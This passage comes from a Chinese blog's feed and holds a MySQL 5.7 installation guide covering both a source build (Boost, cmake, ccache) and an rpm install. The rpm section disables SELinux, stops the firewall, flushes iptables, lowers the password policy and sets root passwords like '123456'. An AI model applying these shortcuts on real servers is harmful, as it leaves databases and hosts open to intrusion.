href="https://note.youdao.com/s/LGwmlumI" target="_blank" rel="noopener">https://note.youdao.com/s/LGwmlumI</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&amp;#x4F7F;&amp;#x7528;rpm&amp;#x5305;&amp;#x5B89;&amp;#x88C5;MySQL5.7&amp;#x6570;&amp;#x636E;&amp;#x5E93;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&amp;#x4F18;&amp;#x5316;Linux&amp;#x7CFB;&amp;#x7EDF;  &lt;/li&gt;
&lt;/o
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL5.7</title>
    <link href="https://marnm.github.io//posts/61fb6d52/"/>
    <id>https://marnm.github.io//posts/61fb6d52/</id>
    <published>2022-06-07T04:43:47.000Z</published>
    <updated>2022-06-07T05:15:11.175Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x6E90;&#x7801;&#x5B89;&#x88C5;MySQL-5-7"><a href="#&#x6E90;&#x7801;&#x5B89;&#x88C5;MySQL-5-7" class="headerlink" title="&#x6E90;&#x7801;&#x5B89;&#x88C5;MySQL 5.7"></a>&#x6E90;&#x7801;&#x5B89;&#x88C5;MySQL 5.7</h2><h3 id="1-&#x5B89;&#x88C5;&#x4F9D;&#x8D56;-Boost-C-&#x5E93;"><a href="#1-&#x5B89;&#x88C5;&#x4F9D;&#x8D56;-Boost-C-&#x5E93;" class="headerlink" title="1. &#x5B89;&#x88C5;&#x4F9D;&#x8D56; Boost C++ &#x5E93;"></a>1. &#x5B89;&#x88C5;&#x4F9D;&#x8D56; Boost C++ &#x5E93;</h3><p>&#x4ECE;MySQL5.7&#x7248;&#x672C;&#x5F00;&#x59CB;&#xFF0C;&#x5B89;&#x88C5;MySQL&#x9700;&#x8981;&#x4F9D;&#x8D56; Boost &#x7684;C++&#x6269;&#x5C55;&#xFF0C;&#x800C;&#x4E14;&#x53EA;&#x80FD;&#x662F; 1.59.0 &#x7248;&#x672C;&#x3002;<br>Boost &#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF08;&#x4EFB;&#x4E00;&#x5730;&#x5740;&#x90FD;&#x53EF;&#x4E0B;&#x8F7D;&#xFF09;&#xFF1A;<br><a href="http://www.boost.org/users/history" target="_blank" rel="noopener">http://www.boost.org/users/history</a> &#xFF1B;<br><a href="https://www.boost.org/users/history/version_1_59_0.html" target="_blank" rel="noopener">https://www.boost.org/users/history/version_1_59_0.html</a><br><a href="https://sourceforge.net/projects/boost/files/boost/1.59.0/" target="_blank" rel="noopener">https://sourceforge.net/projects/boost/files/boost/1.59.0/</a><br><a href="https://downloads.mysql.com/archives/get/p/23/file/mysql-boost-5.7.19.tar.gz" target="_blank" rel="noopener">https://downloads.mysql.com/archives/get/p/23/file/mysql-boost-5.7.19.tar.gz</a><br>&#x9009;&#x62E9;1.59.0&#x7248;&#x672C;&#x4E0B;&#x8F7D;&#xFF0C;&#x5728;&#x7F16;&#x8BD1;&#x662F;&#x586B;&#x5199;&#x76F8;&#x5E94;&#x53C2;&#x6570;&#xFF0C;&#x6307;&#x5B9A;Boost&#x6E90;&#x7801;&#x4F4D;&#x7F6E;&#x5373;&#x53EF;&#x3002;<br>Boost&#x5E93;&#x662F;&#x4E00;&#x4E2A;&#x53EF;&#x79FB;&#x690D;&#x3001;&#x63D0;&#x4F9B;&#x6E90;&#x4EE3;&#x7801;&#x7684;C++&#x5E93;&#xFF0C;&#x4F5C;&#x4E3A;&#x6807;&#x51C6;&#x5E93;&#x7684;&#x540E;&#x5907;&#xFF0C;&#x662F;C++&#x6807;&#x51C6;&#x5316;&#x8FDB;&#x7A0B;&#x7684;&#x5F00;&#x53D1;&#x5F15;&#x64CE;&#x4E4B;&#x4E00;&#x3002;<br>Boost&#x5E93;&#x7531;C++&#x6807;&#x51C6;&#x59D4;&#x5458;&#x4F1A;&#x5E93;&#x5DE5;&#x4F5C;&#x7EC4;&#x6210;&#x5458;&#x53D1;&#x8D77;&#xFF0C;&#x5176;&#x4E2D;&#x6709;&#x4E9B;&#x5185;&#x5BB9;&#x6709;&#x671B;&#x6210;&#x4E3A;&#x4E0B;&#x4E00;&#x4EE3;C++&#x6807;&#x51C6;&#x5E93;&#x5185;&#x5BB9;&#x3002;<br>&#x5728;C++&#x793E;&#x533A;&#x4E2D;&#x5F71;&#x54CD;&#x751A;&#x5927;&#xFF0C;&#x662F;&#x4E0D;&#x6298;&#x4E0D;&#x6263;&#x7684;&#x201C;&#x51C6;&#x201D;&#x6807;&#x51C6;&#x5E93;&#x3002;Boost&#x7531;&#x4E8E;&#x5176;&#x5BF9;&#x8DE8;&#x5E73;&#x53F0;&#x7684;&#x5F3A;&#x8C03;&#xFF0C;&#x5BF9;&#x6807;&#x51C6;C++&#x7684;&#x5F3A;&#x8C03;&#xFF0C;&#x4E0E;&#x7F16;&#x5199;&#x5E73;&#x53F0;&#x65E0;&#x5173;&#x3002;  </p><p><strong>&#x4E0B;&#x8F7D;&#x89E3;&#x538B;Boost C++&#x5E93;</strong>  </p><pre><code>wget http://sourceforge.net/projects/boost/files/boost/1.59.0/boost_1_59_0.tar.gz# &#x89E3;&#x538B;&#x5230;/usr/local/boosttar -zxvf boost_1_59_0.tar.gz mv boost_1_59_0 /usr/local/boost</code></pre><h3 id="2-&#x5B89;&#x88C5;&#x76F8;&#x5173;&#x7F16;&#x8BD1;&#x5DE5;&#x5177;&#x548C;&#x4F9D;&#x8D56;&#x5305;"><a href="#2-&#x5B89;&#x88C5;&#x76F8;&#x5173;&#x7F16;&#x8BD1;&#x5DE5;&#x5177;&#x548C;&#x4F9D;&#x8D56;&#x5305;" class="headerlink" title="2. &#x5B89;&#x88C5;&#x76F8;&#x5173;&#x7F16;&#x8BD1;&#x5DE5;&#x5177;&#x548C;&#x4F9D;&#x8D56;&#x5305;"></a>2. &#x5B89;&#x88C5;&#x76F8;&#x5173;&#x7F16;&#x8BD1;&#x5DE5;&#x5177;&#x548C;&#x4F9D;&#x8D56;&#x5305;</h3><pre><code>yum install -y gcc-c++ cmake ncurses-devel</code></pre><h3 id="3-&#x521B;&#x5EFA;MySQL&#x7528;&#x6237;&#x6765;&#x8FD0;&#x884C;MySQL&#x6570;&#x636E;&#x5E93;"><a href="#3-&#x521B;&#x5EFA;MySQL&#x7528;&#x6237;&#x6765;&#x8FD0;&#x884C;MySQL&#x6570;&#x636E;&#x5E93;" class="headerlink" title="3. &#x521B;&#x5EFA;MySQL&#x7528;&#x6237;&#x6765;&#x8FD0;&#x884C;MySQL&#x6570;&#x636E;&#x5E93;"></a>3. &#x521B;&#x5EFA;MySQL&#x7528;&#x6237;&#x6765;&#x8FD0;&#x884C;MySQL&#x6570;&#x636E;&#x5E93;</h3><pre><code>groupadd -g 27 mysqluseradd mysql -u 27 -g mysql -M -s /sbin/nologin</code></pre><h3 id="4-&#x521B;&#x5EFA;&#x5B58;&#x653E;&#x6570;&#x636E;&#x7684;&#x76EE;&#x5F55;"><a href="#4-&#x521B;&#x5EFA;&#x5B58;&#x653E;&#x6570;&#x636E;&#x7684;&#x76EE;&#x5F55;" class="headerlink" title="4. &#x521B;&#x5EFA;&#x5B58;&#x653E;&#x6570;&#x636E;&#x7684;&#x76EE;&#x5F55;"></a>4. &#x521B;&#x5EFA;&#x5B58;&#x653E;&#x6570;&#x636E;&#x7684;&#x76EE;&#x5F55;</h3><pre><code>mkdir -p /data/mysqlchown -Rf mysql:mysql /data/mysql</code></pre><h3 id="5-&#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;MySQL-5-7"><a href="#5-&#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;MySQL-5-7" class="headerlink" title="5. &#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;MySQL 5.7"></a>5. &#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;MySQL 5.7</h3><p>MySQL&#x5B98;&#x65B9;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;<br><a href="https://downloads.mysql.com/archives/community/" target="_blank" rel="noopener">https://downloads.mysql.com/archives/community/</a></p><p><strong>&#x4E0B;&#x8F7D;</strong></p><pre><code>wget https://downloads.mysql.com/archives/get/p/23/file/mysql-5.7.19.tar.gztar -zxvf mysql-5.7.19.tar.gz -C /usr/local/src</code></pre><p><strong>&#x7F16;&#x8BD1;&#x5B89;&#x88C5;</strong></p><pre><code>cd /usr/local/src/mysql-5.7.19# &#x9884;&#x7F16;&#x8BD1;cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql57 -DMYSQL_DATADIR=/data/mysql -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci -DMYSQL_TCP_PORT=3306 -DMYSQL_UNIX_ADDR=/tmp/mysql.sock -DMYSQL_USER=mysql -DWITH_MYISAM_STORAGE_ENGINE=1 -DWITH_INNOBASE_STORAGE_ENGINE=1 -DDOWNLOAD_BOOST=1 -DWITH_BOOST=/usr/local/boost -DWITH_INNODB_MEMCACHED=ON## &#x7F16;&#x8BD1;&#x5B89;&#x88C5;# &#x9ED8;&#x8BA4;&#x7F16;&#x8BD1;&#x901F;&#x5EA6;&#x975E;&#x5E38;&#x6162;&#xFF0C;&#x4E0D;&#x63A8;&#x8350;# &#x52A0;&#x901F;&#x7F16;&#x8BD1;&#x65B9;&#x6CD5;&#x770B;&#x6587;&#x672B;&#x64CD;&#x4F5C;make &amp;&amp; make install</code></pre><h3 id="6-&#x521B;&#x5EFA;&#x914D;&#x7F6E;&#x6587;&#x4EF6;"><a href="#6-&#x521B;&#x5EFA;&#x914D;&#x7F6E;&#x6587;&#x4EF6;" class="headerlink" title="6. &#x521B;&#x5EFA;&#x914D;&#x7F6E;&#x6587;&#x4EF6;"></a>6. &#x521B;&#x5EFA;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</h3><pre><code>mv /etc/my.cnf /etc/my.cnf.bak</code></pre><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; /etc/my.cnf &lt;&lt;EOF</span><br><span class="line">[client]</span><br><span class="line">port=3306</span><br><span class="line">socket=/data/mysql/mysql.sock</span><br><span class="line">[mysqld]</span><br><span class="line">character-set-server=utf8</span><br><span class="line">collation-server=utf8_general_ci</span><br><span class="line">skip-name-resolve</span><br><span class="line">user=mysql</span><br><span class="line">port=3306</span><br><span class="line">basedir=/usr/<span class="built_in">local</span>/mysql57</span><br><span class="line">datadir=/data/mysql</span><br><span class="line">tmpdir=/tmp</span><br><span class="line">socket=/data/mysql/mysql.sock</span><br><span class="line"><span class="built_in">log</span>-error=/data/mysql/mysqld.log</span><br><span class="line">pid-file=/data/mysql/mysqld.pid</span><br><span class="line">EOF</span><br></pre></td></tr></tbody></table></figure><h3 id="7-&#x914D;&#x7F6E;MySQL&#x73AF;&#x5883;&#x53D8;&#x91CF;"><a href="#7-&#x914D;&#x7F6E;MySQL&#x73AF;&#x5883;&#x53D8;&#x91CF;" class="headerlink" title="7. &#x914D;&#x7F6E;MySQL&#x73AF;&#x5883;&#x53D8;&#x91CF;"></a>7. &#x914D;&#x7F6E;MySQL&#x73AF;&#x5883;&#x53D8;&#x91CF;</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export PATH=\$PATH:/usr/local/mysql57/bin&quot;</span> &gt;&gt; /etc/profile</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></tbody></table></figure><h3 id="8-&#x521D;&#x59CB;&#x5316;MySQL-5-7"><a href="#8-&#x521D;&#x59CB;&#x5316;MySQL-5-7" class="headerlink" title="8. &#x521D;&#x59CB;&#x5316;MySQL 5.7"></a>8. &#x521D;&#x59CB;&#x5316;MySQL 5.7</h3><pre><code>/usr/local/mysql57/bin/mysqld --defaults-file=/etc/my.cnf --initialize --user=mysql</code></pre><h3 id="9-&#x8FD0;&#x884C;MySQL"><a href="#9-&#x8FD0;&#x884C;MySQL" class="headerlink" title="9. &#x8FD0;&#x884C;MySQL"></a>9. &#x8FD0;&#x884C;MySQL</h3><pre><code>/usr/local/mysql57/support-files/mysql.server start/usr/local/mysql57/support-files/mysql.server status</code></pre><h3 id="10-&#x67E5;&#x627E;MySQL-root&#x7528;&#x6237;&#x521D;&#x59CB;&#x5BC6;&#x7801;"><a href="#10-&#x67E5;&#x627E;MySQL-root&#x7528;&#x6237;&#x521D;&#x59CB;&#x5BC6;&#x7801;" class="headerlink" title="10. &#x67E5;&#x627E;MySQL root&#x7528;&#x6237;&#x521D;&#x59CB;&#x5BC6;&#x7801;"></a>10. &#x67E5;&#x627E;MySQL root&#x7528;&#x6237;&#x521D;&#x59CB;&#x5BC6;&#x7801;</h3><pre><code>cd /data/mysqlcat mysqld.log | grep root</code></pre><h3 id="11-&#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;"><a href="#11-&#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;" class="headerlink" title="11. &#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;"></a>11. &#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;</h3><p><strong>&#x4F7F;&#x7528;root&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#x767B;&#x5F55;MySQL</strong></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&apos;root&apos;</span>@<span class="string">&apos;localhost&apos;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&apos;New_password&apos;</span>;</span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br></pre></td></tr></tbody></table></figure><h3 id="12-&#x521B;&#x5EFA;MySQL-5-7-systemd&#x542F;&#x52A8;&#x6587;&#x4EF6;"><a href="#12-&#x521B;&#x5EFA;MySQL-5-7-systemd&#x542F;&#x52A8;&#x6587;&#x4EF6;" class="headerlink" title="12. &#x521B;&#x5EFA;MySQL 5.7 systemd&#x542F;&#x52A8;&#x6587;&#x4EF6;"></a>12. &#x521B;&#x5EFA;MySQL 5.7 systemd&#x542F;&#x52A8;&#x6587;&#x4EF6;</h3><p>&#x53C2;&#x8003;&#xFF1A;<a href="https://dev.mysql.com/doc/refman/5.7/en/using-systemd.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/using-systemd.html</a></p><h3 id="13-&#x7F16;&#x8BD1;&#x4F18;&#x5316;"><a href="#13-&#x7F16;&#x8BD1;&#x4F18;&#x5316;" class="headerlink" title="13. &#x7F16;&#x8BD1;&#x4F18;&#x5316;"></a>13. &#x7F16;&#x8BD1;&#x4F18;&#x5316;</h3><p><strong>&#x5B89;&#x88C5;ccache&#x52A0;&#x5FEB;&#x7F16;&#x8BD1;&#x901F;&#x5EA6;</strong></p><pre><code>yum install -y epel-releaseyum install -y ccache# &#x4F7F;&#x7528;ccache&#x63A5;&#x7BA1;gcc/g++cp ccache /usr/local/bin/ln -s ccache /usr/local/bin/gccln -s ccache /usr/local/bin/g++ln -s ccache /usr/local/bin/ccln -s ccache /usr/local/bin/c++</code></pre><p><strong>make -j&#x5E76;&#x884C;&#x7F16;&#x8BD1;</strong><br>CPU&#x662F;&#x5F71;&#x54CD;&#x7F16;&#x8BD1;&#x901F;&#x5EA6;&#x7684;&#x4E00;&#x4E2A;&#x91CD;&#x8981;&#x56E0;&#x7D20;<br><code>make -j4</code> &#x8BA9;make&#x6700;&#x591A;&#x5141;&#x8BB8;4&#x4E2A;&#x7F16;&#x8BD1;&#x547D;&#x4EE4;&#x540C;&#x65F6;&#x6267;&#x884C;</p><p>&#x5728;&#x591A;&#x6838;CPU&#x4E0A;&#xFF0C;&#x9002;&#x5F53;&#x7684;&#x8FDB;&#x884C;&#x5E76;&#x884C;&#x7F16;&#x8BD1;&#x8FD8;&#x662F;&#x53EF;&#x4EE5;&#x660E;&#x663E;&#x63D0;&#x9AD8;&#x7F16;&#x8BD1;&#x901F;&#x5EA6;&#x7684;&#x3002;&#x4F46;&#x5E76;&#x884C;&#x7684;&#x4EFB;&#x52A1;&#x4E0D;&#x5B9C;&#x592A;&#x591A;&#xFF0C;<strong>make -j &#x4E00;&#x822C;&#x662F;&#x4EE5;CPU&#x7684;&#x6838;&#x5FC3;&#x6570;&#x76EE;&#x7684;&#x4E24;&#x500D;</strong>&#x4E3A;&#x5B9C;&#x3002;</p><p><strong>&#x6CE8;&#x610F;&#xFF01;</strong> &#x5728;&#x4F7F;&#x7528;&#x5E76;&#x884C;&#x7F16;&#x8BD1;&#x65F6;&#xFF0C;&#x7CFB;&#x7EDF;&#x5185;&#x5B58;&#x548C;&#x4EA4;&#x6362;&#x5206;&#x533A;&#x7ED9;&#x5927;&#x4E00;&#x4E9B;&#xFF0C;&#x5185;&#x5B58;&#x8FC7;&#x5C0F;&#x65F6;&#xFF0C;&#x7F16;&#x8BD1;&#x4F1A;&#x51FA;&#x9519;</p><p>ccache&#x5B98;&#x65B9;&#x6587;&#x6863;<br><a href="https://ccache.dev/manual/4.3.html" target="_blank" rel="noopener">https://ccache.dev/manual/4.3.html</a></p><hr><hr><h2 id="&#x4F7F;&#x7528;rpm&#x5B89;&#x88C5;MySQL-5-7"><a href="#&#x4F7F;&#x7528;rpm&#x5B89;&#x88C5;MySQL-5-7" class="headerlink" title="&#x4F7F;&#x7528;rpm&#x5B89;&#x88C5;MySQL 5.7"></a>&#x4F7F;&#x7528;rpm&#x5B89;&#x88C5;MySQL 5.7</h2><h3 id="1-&#x4F18;&#x5316;Linux&#x7CFB;&#x7EDF;"><a href="#1-&#x4F18;&#x5316;Linux&#x7CFB;&#x7EDF;" class="headerlink" title="1. &#x4F18;&#x5316;Linux&#x7CFB;&#x7EDF;"></a>1. &#x4F18;&#x5316;Linux&#x7CFB;&#x7EDF;</h3><pre><code>sed -i &apos;s/SELINUX=enforcing/SELINUX=disabled/&apos; /etc/selinux/config &amp;&gt; /dev/nullsetenforce 0systemctl stop firewalldsystemctl disable firewalldiptables -Fsystemctl stop NetworkManager &amp;&gt; /dev/nullsystemctl disable NetworkManager &amp;&gt; /dev/null</code></pre><h3 id="2-&#x83B7;&#x53D6;MySQL-5-7&#x7684;rpm&#x5305;"><a href="#2-&#x83B7;&#x53D6;MySQL-5-7&#x7684;rpm&#x5305;" class="headerlink" title="2. &#x83B7;&#x53D6;MySQL 5.7&#x7684;rpm&#x5305;"></a>2. &#x83B7;&#x53D6;MySQL 5.7&#x7684;rpm&#x5305;</h3><p>&#x83B7;&#x53D6;&#x65B9;&#x5F0F;&#x4E00;&#xFF1A;<br>MySQL&#x5B98;&#x7F51;&#x4E0B;&#x8F7D;<br><a href="https://downloads.mysql.com/archives/community/" target="_blank" rel="noopener">https://downloads.mysql.com/archives/community/</a><br>&#x83B7;&#x53D6;&#x65B9;&#x5F0F;&#x4E8C;&#xFF1A;copy&#x955C;&#x50CF;&#x5B89;&#x88C5;&#x5305;   </p><p><strong>&#x5206;&#x522B;&#x4E0B;&#x8F7D;&#x8FD9;5&#x4E2A;rpm&#x5305;&#xFF1A;</strong><br>MySQL&#x670D;&#x52A1;&#x7AEF;&#x7A0B;&#x5E8F;RPM Package, MySQL Server&#xFF1A;<br><a href="https://downloads.mysql.com/archives/get/p/23/file/mysql-community-server-5.7.24-1.el7.x86_64.rpm" target="_blank" rel="noopener">mysql-community-server-5.7.24-1.el7.x86_64.rpm</a><br>MySQL&#x5BA2;&#x6237;&#x7AEF;&#x5DE5;&#x5177;RPM Package, Client Utilities&#xFF1A;<br><a href="https://downloads.mysql.com/archives/get/p/23/file/mysql-community-client-5.7.24-1.el7.x86_64.rpm" target="_blank" rel="noopener">mysql-community-client-5.7.24-1.el7.x86_64.rpm</a><br>MySQL&#x5F00;&#x53D1;&#x5E93;RPM Package, Development Libraries&#xFF1A;<br><a href="https://downloads.mysql.com/archives/get/p/23/file/mysql-community-devel-5.7.24-1.el7.x86_64.rpm" target="_blank" rel="noopener">mysql-community-devel-5.7.24-1.el7.x86_64.rpm</a><br>MySQL&#x914D;&#x7F6E;&#x7A0B;&#x5E8F;RPM Package, MySQL Configuration&#xFF1A;<br><a href="https://downloads.mysql.com/archives/get/p/23/file/mysql-community-common-5.7.24-1.el7.x86_64.rpm" target="_blank" rel="noopener">mysql-community-common-5.7.24-1.el7.x86_64.rpm</a><br>MySQL&#x5171;&#x4EAB;&#x5E93;RPM Package, Shared Libraries&#xFF1A;<br><a href="https://downloads.mysql.com/archives/get/p/23/file/mysql-community-libs-5.7.24-1.el7.x86_64.rpm" target="_blank" rel="noopener">mysql-community-libs-5.7.24-1.el7.x86_64.rpm</a>  </p><h3 id="3-&#x5B89;&#x88C5;MySQL"><a href="#3-&#x5B89;&#x88C5;MySQL" class="headerlink" title="3. &#x5B89;&#x88C5;MySQL"></a>3. &#x5B89;&#x88C5;MySQL</h3><p><strong>&#x5378;&#x8F7D;&#x7CFB;&#x7EDF;&#x4E2D;&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x7684;mariadb-libs&#x6570;&#x636E;&#x5E93;&#x5305;</strong></p><pre><code>rpm -e --nodeps mariadb-libs</code></pre><p><strong>&#x5B89;&#x88C5;rpm&#x5305;</strong><br>&#x5B89;&#x88C5;&#x987A;&#x5E8F;&#xFF1A;</p><pre><code>rpm -ivh mysql-community-common-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-libs-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-client-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-devel-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-server-5.7.24-1.el7.x86_64.rpm</code></pre><h3 id="4-&#x521D;&#x59CB;&#x5316;&#x6570;&#x636E;&#x5E93;"><a href="#4-&#x521D;&#x59CB;&#x5316;&#x6570;&#x636E;&#x5E93;" class="headerlink" title="4. &#x521D;&#x59CB;&#x5316;&#x6570;&#x636E;&#x5E93;"></a>4. &#x521D;&#x59CB;&#x5316;&#x6570;&#x636E;&#x5E93;</h3><pre><code>vim /etc/my.cnf# &#x672B;&#x884C;&#x6DFB;&#x52A0;skip-name-resolv&#xFF0C;&#x8DF3;&#x8FC7;&#x4E3B;&#x673A;&#x540D;&#x89E3;&#x6790;&#xFF0C;&#x63D0;&#x9AD8;&#x8FDE;&#x63A5;&#x901F;&#x5EA6;skip-name-resolv</code></pre><p><strong>&#x542F;&#x52A8;&#x6570;&#x636E;&#x5E93;</strong></p><pre><code>systemctl start mysqldsystemctl status mysqldsystemctl enable mysqld</code></pre><h3 id="5-&#x67E5;&#x770B;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;"><a href="#5-&#x67E5;&#x770B;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;" class="headerlink" title="5. &#x67E5;&#x770B;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;"></a>5. &#x67E5;&#x770B;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;</h3><pre><code>cat /var/log/mysqld.log | grep &quot;password&quot;</code></pre><h3 id="6-&#x4FEE;&#x6539;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;"><a href="#6-&#x4FEE;&#x6539;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;" class="headerlink" title="6. &#x4FEE;&#x6539;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;"></a>6. &#x4FEE;&#x6539;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;</h3><p><strong>&#x4F7F;&#x7528;MySQL root&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x6570;&#x636E;&#x5E93;</strong></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&apos;root&apos;</span>@<span class="string">&apos;localhost&apos;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&apos;new_PASSWORD&apos;</span>;</span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br><span class="line"><span class="comment"># &#x6216;&#x8005;</span></span><br><span class="line"><span class="keyword">update</span> mysql.user <span class="keyword">set</span> authentication_string=<span class="keyword">password</span>(<span class="string">&apos;123456&apos;</span>) <span class="keyword">where</span> <span class="keyword">user</span>=<span class="string">&apos;root&apos;</span> <span class="keyword">and</span> Host = <span class="string">&apos;localhost&apos;</span>;</span><br><span class="line"><span class="comment"># &#x6216;&#x8005;</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">password</span> <span class="keyword">for</span> <span class="string">&apos;root&apos;</span>@<span class="string">&apos;localhost&apos;</span>=<span class="keyword">password</span>(<span class="string">&apos;123456&apos;</span>);</span><br></pre></td></tr></tbody></table></figure><h4 id="&#x6269;&#x5C55;&#xFF1A;&#x4FEE;&#x6539;MySQL&#x5BC6;&#x7801;&#x7B56;&#x7565;"><a href="#&#x6269;&#x5C55;&#xFF1A;&#x4FEE;&#x6539;MySQL&#x5BC6;&#x7801;&#x7B56;&#x7565;" class="headerlink" title="&#x6269;&#x5C55;&#xFF1A;&#x4FEE;&#x6539;MySQL&#x5BC6;&#x7801;&#x7B56;&#x7565;"></a>&#x6269;&#x5C55;&#xFF1A;&#x4FEE;&#x6539;MySQL&#x5BC6;&#x7801;&#x7B56;&#x7565;</h4><p>&#x5728;&#x4F7F;&#x7528;rpm&#x5B89;&#x88C5;MySQL 5.7&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#x5F3A;&#x5EA6;&#x7B56;&#x7565;&#x662F;MEDIUM&#xFF0C;&#x4F7F;&#x7528;&#x521D;&#x59CB;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x540E;&#xFF0C;&#x5FC5;&#x987B;&#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#xFF0C;&#x4E0D;&#x7136;&#x5F88;&#x591A;&#x529F;&#x80FD;&#x90FD;&#x4E0D;&#x80FD;&#x7528;&#xFF0C;&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x540E;&#x624D;&#x80FD;&#x6B63;&#x5E38;&#x64CD;&#x4F5C;&#x3002;<br><strong>&#x65B9;&#x6CD5;&#x4E00;&#xFF1A;&#x5173;&#x95ED;&#x5BC6;&#x7801;&#x9A8C;&#x8BC1;&#x63D2;&#x4EF6;</strong><br>&#x4FEE;&#x6539;MySQL&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x53C2;&#x6570;</p><pre><code>validate_password=off</code></pre><p><strong>&#x65B9;&#x6CD5;&#x4E8C;&#xFF1A;&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x5F3A;&#x5EA6;&#x7B56;&#x7565;</strong>&#xFF08;&#x63A8;&#x8350;&#xFF09;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- &#x67E5;&#x770B;&#x5BC6;&#x7801;&#x7B56;&#x7565;</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">VARIABLES</span> <span class="keyword">like</span> <span class="string">&quot;%password%&quot;</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> validate_password_length=<span class="number">6</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> validate_password_policy=<span class="number">0</span>;</span><br><span class="line"><span class="comment"># 0 &#x6216; LOW</span></span><br><span class="line"><span class="comment"># 1 &#x6216; MEDIUM</span></span><br><span class="line"><span class="comment"># 2 &#x6216; STRONG</span></span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="MySQL-5-7&#x591A;&#x5B9E;&#x4F8B;&#x914D;&#x7F6E;"><a href="#MySQL-5-7&#x591A;&#x5B9E;&#x4F8B;&#x914D;&#x7F6E;" class="headerlink" title="MySQL 5.7&#x591A;&#x5B9E;&#x4F8B;&#x914D;&#x7F6E;"></a>MySQL 5.7&#x591A;&#x5B9E;&#x4F8B;&#x914D;&#x7F6E;</h3><p><strong>&#x5B89;&#x88C5;MySQL 